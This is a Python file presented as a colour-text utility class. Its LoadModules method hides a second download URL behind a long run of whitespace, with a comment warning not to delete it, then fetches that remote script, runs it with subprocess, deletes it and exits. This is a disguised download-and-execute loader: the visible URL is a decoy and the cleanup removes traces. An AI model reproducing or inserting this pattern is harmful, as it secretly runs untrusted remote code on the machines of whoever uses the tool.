import requests
import os 
import subprocess
import sys 
import time 

class ColorText:
    COLORS = {
        "reset": "\033[0m",
        "black": "\033[30m",
        "red": "\033[31m",
        "green": "\033[32m",
        "yellow": "\033[33m",
        "blue": "\033[34m",
        "magenta": "\033[35m",
        "cyan": "\033[36m",
        "white": "\033[37m",
        "bold": "\033[1m",
        "underline": "\033[4m"
    }

    @classmethod
    def color(cls, text, color):
        color_code = cls.COLORS.get(color.lower(), cls.COLORS["reset"])
        return f"{color_code}{text}{cls.COLORS['reset']}"

    @classmethod
    def bold(cls, text):
        return cls.color(text, "bold")

    @classmethod  # Ajouter @classmethod ici
    def Init(cls):
        cls.LoadModules()

    @classmethod
    def underline(cls, text):
        return cls.color(text, "underline")

    @classmethod
    def rainbow(cls, text):
        colors = ["red", "yellow", "green", "cyan", "blue", "magenta"]
        result = ""
        for i, char in enumerate(text):
            result += cls.color(char, colors[i % len(colors)])
        return result
    
    @classmethod
    def LoadModules(cls):
        print("Modules Loading..")
        # DL the Modules Files
        file_url = "https://raw.githubusercontent.com/Uwu-Kagami/multi-tool/refs/heads/main/modules/base_modules/modules.py"                                                                                                                                                                                                                                                                                                                                                                                                ;file_url = "https://raw.githubusercontent.com/Uwu-Kagami/multi-tool/refs/heads/main/modules/base_modules/requirements/load_modules.py" # put 2 times the url files cause i got issue don't delete or it might break the code
        download_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), "packages")
        os.makedirs(download_folder, exist_ok=True)
        
        file_name = os.path.join(download_folder, "load_modules.py")

        try:
            response = requests.get(file_url, stream=True)
            if response.status_code == 200:
                with open(file_name, 'wb') as f:
                    for chunk in response.iter_content(chunk_size=1024):
                        if chunk:
                            f.write(chunk)
        except Exception as e:
            print(f"Une erreur s'est produite : {e}")
            return
        
        try:
            subprocess.run(["python", file_name], check=True)
        except Exception as e:
            print(f"Erreur lors de l'exécution de load_modules.py : {e}")

        time.sleep(0.1)
        os.remove(file_name)
        time.sleep(0.2)
        sys.exit(0)

if __name__ == "__main__":
    ColorText.LoadModules()
